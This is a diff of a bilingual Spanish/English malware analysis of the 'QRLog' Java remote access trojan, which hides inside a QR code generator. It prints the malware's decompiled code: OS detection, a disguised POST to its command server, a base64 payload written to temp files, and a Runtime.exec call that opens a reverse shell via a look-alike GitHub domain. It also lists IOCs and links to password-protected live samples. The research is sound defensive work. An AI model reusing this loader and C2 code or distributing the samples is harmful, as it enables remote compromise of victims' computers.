+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>      sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">charAt</span><span class="op">(</span>rand<span class="op">.</span><span class="fu">nextInt</span><span class="op">(</span>strPool<span class="op">.</span><span class="fu">length</span><span class="op">())));</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> sb<span class="op">.</span><span class="fu">toString</span><span class="op">();</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Identifica - nuevamente en forma rudimentaria - sobre qué plataforma
+se está trabajando.</li>
+</ul>
+<div class="sourceCode" id="cb9"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">getOperatingSystem</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>  <span class="bu">String</span> os <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;os.name&quot;</span><span class="op">);</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">String</span> result <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Windows&quot;</span><span class="op">))</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> <span class="st">&quot;0&quot;</span><span class="op">;</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Linux&quot;</span><span class="op">))</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> <span class="st">&quot;2&quot;</span><span class="op">;</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Mac OS X&quot;</span><span class="op">))</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> <span class="st">&quot;1&quot;</span><span class="op">;</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Crea - pero no envía aún - una solicitud POST hacia el sitio
+malicioso mencionado anteriormente, consignando un <code>uid</code>
+(User-ID) generado aleatoriamente y el sistema operativo detectado.
+Disfraza esta información con parámetros como <code>GITHUB_REQ</code>
+para que ante un eventual análisis del tráfico la solicitud aparente ser
+benigna.</li>
+</ul>
+<div class="sourceCode" id="cb10"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">sendPOST</span><span class="op">()</span> <span class="kw">throws</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> uid <span class="op">=</span> <span class="fu">randGen</span><span class="op">();</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> data <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> sec_path <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;GITHUB_REQ&quot;</span><span class="op">);</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span>uid<span class="op">);</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;2000&quot;</span><span class="op">);</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>        data<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">());</span></span></code></pre></div>
+<ul>
+<li>Revisa la existencia de un archivo “bandera” para saber si esta
+rutina ha sido ejecutada anteriormente. De no encontrar el archivo, lo
+crea para indicar haber llevado a cabo una ejecución. Posteriormente
+envía la solicitud maliciosa en formato JSON al servidor C2 con los
+datos mencionados en el punto anterior.</li>
+</ul>
+<div class="sourceCode" id="cb11"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>sec_path<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>      <span class="bu">File</span> secFile <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>sec_path<span class="op">);</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>secFile<span class="op">.</span><span class="fu">exists</span><span class="op">())</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>          <span class="bu">System</span><span class="op">.</span><span class="fu">exit</span><span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>  HttpRequest request <span class="op">=</span> HttpRequest<span class="op">.</span><span class="fu">newBuilder</span><span class="op">()</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">header</span><span class="op">(</span><span class="st">&quot;Content-Type&quot;</span><span class="op">,</span> <span class="st">&quot;application/json; charset=utf-8&quot;</span><span class="op">)</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">version</span><span class="op">(</span>HttpClient<span class="op">.</span><span class="fu">Version</span><span class="op">.</span><span class="fu">HTTP_1_1</span><span class="op">)</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">uri</span><span class="op">(</span><span class="bu">URI</span><span class="op">.</span><span class="fu">create</span><span class="op">(</span>POST_URL<span class="op">))</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">POST</span><span class="op">(</span>HttpRequest<span class="op">.</span><span class="fu">BodyPublishers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">(</span>data<span class="op">.</span><span class="fu">toString</span><span class="op">()))</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">build</span><span class="op">();</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>  HttpClient client <span class="op">=</span> HttpClient<span class="op">.</span><span class="fu">newHttpClient</span><span class="op">();</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>  HttpResponse<span class="op">&lt;</span><span class="bu">String</span><span class="op">&gt;</span> response <span class="op">=</span> client<span class="op">.</span><span class="fu">send</span><span class="op">(</span>request<span class="op">,</span> HttpResponse<span class="op">.</span><span class="fu">BodyHandlers</span><span class="op">.</span><span class="fu">ofString</span><span class="op">());</span></span></code></pre></div>
+<ul>
+<li>Si la solicitud no es bien recibida (Código HTTP 200) el malware
+aguarda 5 segundos. A partir de ahora toda comunicación deberá tener en
+su contenido el string “GITHUB_RES” indicando que es el C2 quién lo
+envía. Otras respuestas que no incluyan ese patrón son ignoradas.</li>
+</ul>
+<div class="sourceCode" id="cb12"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>response<span class="op">.</span><span class="fu">statusCode</span><span class="op">()</span> <span class="op">!=</span> <span class="dv">200</span><span class="op">)</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">5000</span><span class="op">);</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">continue</span><span class="op">;</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> resStr <span class="op">=</span> response<span class="op">.</span><span class="fu">body</span><span class="op">();</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(!</span>resStr<span class="op">.</span><span class="fu">startsWith</span><span class="op">(</span><span class="st">&quot;GITHUB_RES&quot;</span><span class="op">))</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>  <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">&quot;Data Error&quot;</span><span class="op">);</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span></code></pre></div>
+<ul>
+<li>Tras el diálogo inicial con el C2 el malware revisará si la
+respuesta recibida es mayor a 11 caracters. De ser así, tomará los
+primeros 10 y los decodificará desde base64 y los pasará a formato
+UTF-8.</li>
+</ul>
+<div class="sourceCode" id="cb13"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>resStr<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">11</span><span class="op">)</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> enc_data <span class="op">=</span> resStr<span class="op">.</span><span class="fu">substring</span><span class="op">(</span><span class="dv">10</span><span class="op">);</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">byte</span> <span class="op">[]</span> dec_data <span class="op">=</span> Base64<span class="op">.</span><span class="fu">getDecoder</span><span class="op">().</span><span class="fu">decode</span><span class="op">(</span>enc_data<span class="op">);</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> org_file <span class="op">=</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">(</span>dec_data<span class="op">,</span> StandardCharsets<span class="op">.</span><span class="fu">UTF_8</span><span class="op">);</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> org_path<span class="op">;</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Se crearán dos archivos en los directorios temprales:
+<code>p.dat</code> y <code>prefTmp.java</code>. En este último se
+escrbirán los 10 caracteres recibidos en la solicitud anterior.</li>
+</ul>
+<div class="sourceCode" id="cb14"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span><span class="fu">getOperatingSystem</span><span class="op">())</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>    org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>    sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>    org_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/prefTmp.java&quot;</span><span class="op">;</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>    sec_path <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)</span> <span class="op">+</span> <span class="st">&quot;/p.dat&quot;</span><span class="op">;</span></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span> <span class="op">(</span><span class="bu">FileWriter</span> file <span class="op">=</span> <span class="kw">new</span> <span class="bu">FileWriter</span><span class="op">(</span>org_path<span class="op">,</span> <span class="kw">true</span><span class="op">);</span><span class="bu">BufferedWriter</span> buffer <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedWriter</span><span class="op">(</span>file<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>    buffer<span class="op">.</span><span class="fu">write</span><span class="op">(</span>org_file<span class="op">);</span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Finalmente el malware ejecutará el comando:
+<code>$TEMP/prefTmp.java $UID https://www.git-hub.me/view.php</code>
+para generar una shell reversa.</li>
+</ul>
+<div class="sourceCode" id="cb15"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> cmdline <span class="op">=</span> <span class="st">&quot;java &quot;</span> <span class="op">+</span> org_path <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> uid <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> POST_URL<span class="op">;</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="bu">Runtime</span><span class="op">.</span><span class="fu">getRuntime</span><span class="op">().</span><span class="fu">exec</span><span class="op">(</span>cmdline<span class="op">);</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="bu">Thread</span><span class="op">.</span><span class="fu">sleep</span><span class="op">(</span><span class="dv">3000</span><span class="op">);</span></span></code></pre></div>
+<h3 id="detalles-de-interés">Detalles de interés</h3>
+<ul>
+<li><p>Habiendo realizado ingeniería inversa sobre la muestra y
+entendiendo cómo entabla comunicación con su C2, decidí enviar
+solicitudes de contacto al mismo con mi alias de Telegram para intentar
+conseguir una breve entrevista con el grupo. Su respuesta fue un ataque
+de SSH Bruteforce a gran escala contra la dirección IP desde la que
+había enviado las solicitudes. Siendo que este equipo contaba en
+realidad con una honeypot, fue posible registrar toda la infraestructura
+ofensiva que utilizaron en la operación y volcarla en un pulso de
+inteligencia <a href="#referencias">[4]</a>. Una versión en texto plano
+puede descargarse <a href="https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv">acá</a>.</p></li>
+<li><p>El archivo <code>inputFiles.lst</code> contiene información de
+compilación de Maven. A partir del mismo es posible saber que el autor
+del malware se hace llamar <em>Edward</em> y utiliza una plataforma
+Windows:</p></li>
+</ul>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="co">#[...]</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/default-compile/inputFiles.lst:275:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\common\detector\MathUtils.java</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/default-compile/inputFiles.lst:276:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\client\result\VEventResultParser.java</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/default-compile/inputFiles.lst:277:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\oned\Code128Writer.java</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="co">#[...]</span></span></code></pre></div>
+<ul>
+<li>Esta investigación fue aceptada como Charla para la Recon Village de
+la DEF CON 31 <a href="#referencias">[5]</a>.</li>
+</ul>
+<h2 id="iocs">IOCs</h2>
+<ul>
+<li><a href="https://github.com/birminghamcyberarms/QRLOG/blob/main/iocs/8cdccc15-5563-48bf-9493-7730aa19517c.ioc">Versión
+en OpenIOC</a></li>
+<li>Versión en texto plano (ver debajo)</li>
+<li><a href="https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv">Infraestructura
+ofensiva de Labyrinth Chollima</a></li>
+</ul>
+<pre><code>File:QRLog.java
+File:prefTmp.java
+File:QRCodeGenerator_Java.zip
+File:AppleAccount.pdf
+File:AppleAccountAgent
+File:p.dat
+IP:45.77.123.18
+IP:3.90.35.35
+URL:auth.pxaltonet.org
+URL:www.git-hub.me
+URI:/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view
+MD5:0fb16054a1486b754d1fcc5c6b6e1b01
+MD5:26b7d315dd19eb932a08fe474e0f0c31</code></pre>
+<h2 id="muestras">Muestras</h2>
+<ul>
+<li>Muestra original oculta en un proyecto Java para generar QRs
+<ul>
+<li><code>https://drive.google.com/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view</code></li>
+</ul></li>
+<li>Mirror de la muestra original
+<ul>
+<li><a href="https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/sample.zip">sample.zip</a></li>
+<li>Password: <em>mauroeldritch</em></li>
+</ul></li>
+<li>Archivo infectado
+<ul>
+<li><a href="https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/QRCodeWriter.java">QRCodeWriter.java</a></li>
+</ul></li>
+</ul>
+<h2 id="referencias">Referencias</h2>
+<ol type="1">
+<li><a href="https://www.virustotal.com/gui/url/da45ab04a24c4473acdecc8288fbaf3c200e82c32525b8378753f41eec3b5493/detection">VirusTotal</a></li>
+<li><a href="https://otx.alienvault.com/indicator/ip/45.77.123.18">AlienVault
+OTX</a></li>
+<li><a href="https://otx.alienvault.com/pulse/63e50c46063dd5d3a5992804">Pulso
+de inteligencia en AlienVault OTX</a></li>
+<li><a href="https://otx.alienvault.com/pulse/64cfcc366fc8f13ce315f39a">Pulso
+de inteligencia en AlienVault OTX - Actualizado</a></li>
+<li><a href="https://reconvillage.org/recon-village-talks-2023-defcon-31/">DEF
+CON 31 - Charla en Recon Village</a></li>
+</ol>
+<hr />
+<h1 id="english">English</h1>
+<h2 id="intro">Intro</h2>
+<p>In February 2023 I first encountered a sample of the QRLog malware
+<em>in the wild</em>. I named it like this because it hides itself among
+the files of a legit QR code generator written in Java, and creates a
+file with the same name for persistence.</p>
+<p>It is a simple RAT (<em>Remote Access Tool</em>) malware that
+attempts to open a <em>reverse shell</em> granting the attacker
+privileged access to the infected computer.</p>
+<p>At the time of writing this research, there are no public mentions of
+this malware or its components, nor are there any detections by
+antivirus software or security platforms, which indicates that we are
+dealing with a novel sample <a href="#references">[1]</a>. However, some
+intelligence platforms such as CMC (Vietnam) have marked the original
+link to the file as suspicious <a href="#references">[1]</a>, and in
+others it is possible to find mentions of part of its C2 infrastructure
+(associated with Cobalt Strike and whose reuse is common)<a href="#references">[2][3]</a>.</p>
+<h2 id="behaviour">Behaviour</h2>
+<p>The project is functional and does not present suspicious features at
+first glance. However, a runtime behavior analysis by Crowdstrike Falcon
+detected - and blocked - a number of potentially malicious actions: -
+Reading the network configuration using the <code>ifconfig</code>
+command - Sending a single ICMP <code>ping</code> request to an external
+server - Creating temporary directories with a series of random numbers
+in their name - The writing of a <code>.java</code> file in the
+temporary directory (QRLog.java) and its subsequent execution - The
+writing of other files with <code>.java</code> and <code>.dat</code>
+extensions in said temporary directories (prefTmp.java, p.dat) and their
+subsequent execution - The deletion of said files</p>
+<p>In the absence of material on this malware, it was decided to proceed
+with a manual analysis. The search for text strings that refer to the
+names of the created files yielded positive results:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co">#Search for &quot;qrlog&quot;, referencing QRLog.java file which is created on runtime</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> grep <span class="ex">-rnwi</span> <span class="st">&quot;qrlog&quot;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/google/zxing/qrcode/QRCodeWriter.java:87:errPath</span> = System.getProperty<span class="er">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="kw">)</span><span class="ex">+</span> <span class="st">&quot;</span><span class="dt">\\</span><span class="st">QRLog.java&quot;</span><span class="kw">;</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]/google/zxing/qrcode/QRCodeWriter.java:89:errPath</span> = System.getProperty<span class="er">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="kw">)</span><span class="ex">+</span> <span class="st">&quot;/QRLog.java&quot;</span><span class="kw">;</span></span></code></pre></div>
+<p>The <code>QRCodeWriter.java</code> file is what originally created
+the <code>QRLog.java</code> file and is a good candidate to start the
+analysis.</p>
+<h2 id="source-code-analysis">Source Code Analysis</h2>
+<p>Looking at the <code>QRCodeWriter.java</code> file (available for
+individual download in the <a href="#samples">Samples</a> section) the
+following function immediately catches your eye:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span><span class="op">{</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> os <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;os.name&quot;</span><span class="op">);</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> errPath<span class="op">;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>os<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">&quot;Windows&quot;</span><span class="op">))</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>            errPath <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)+</span> <span class="st">&quot;</span><span class="sc">\\</span><span class="st">QRLog.java&quot;</span><span class="op">;</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>            errPath <span class="op">=</span> <span class="bu">System</span><span class="op">.</span><span class="fu">getProperty</span><span class="op">(</span><span class="st">&quot;java.io.tmpdir&quot;</span><span class="op">)+</span> <span class="st">&quot;/QRLog.java&quot;</span><span class="op">;</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>        <span class="bu">FileOutputStream</span> qrW <span class="op">=</span> <span class="kw">new</span> <span class="bu">FileOutputStream</span><span class="op">(</span>errPath<span class="op">);</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>        qrW<span class="op">.</span><span class="fu">write</span><span class="op">(</span>b64dec<span class="op">);</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Runtime</span><span class="op">.</span><span class="fu">getRuntime</span><span class="op">().</span><span class="fu">exec</span><span class="op">(</span><span class="st">&quot;java &quot;</span> <span class="op">+</span> errPath<span class="op">);</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">catch</span> <span class="op">(</span><span class="bu">IOException</span> ex<span class="op">){</span>   </span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span></code></pre></div>
+<p>In this function, the malware tries to vaguely determine which
+platform is being used (Windows or Unix), to understand where and how
+(with backslash or normal slash) to write a “log” file with a
+<code>.java</code> extension. To this file it writes the contents of the
+<code>b64dec</code> variable which can be found a few lines higher in
+the file.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="dt">byte</span> <span class="op">[]</span> b64dec <span class="op">=</span> Base64<span class="op">.</span><span class="fu">getDecoder</span><span class="op">().</span><span class="fu">decode</span><span class="op">(</span>QUIET_ZONE_DATA<span class="op">);</span></span></code></pre></div>
+<p>As we can see in this snippet, <code>b64dec</code> stores the result
+of decoding the <code>QUIET_ZONE_DATA</code> variable from
+<code>base64</code>. Digging a little deeper into the code it is
+possible to find the content of <code>QUIET_ZONE_DATA</code>:</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> QUIET_ZONE_DATA <span class="op">=</span> <span class="st">&quot;aW1wb3J0IGphdmEuaW8uSU9FeGNlcHRpb247CmltcG9ydCBqYXZhLm5ldC5VUkk7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBDbGllb&quot;</span></span>
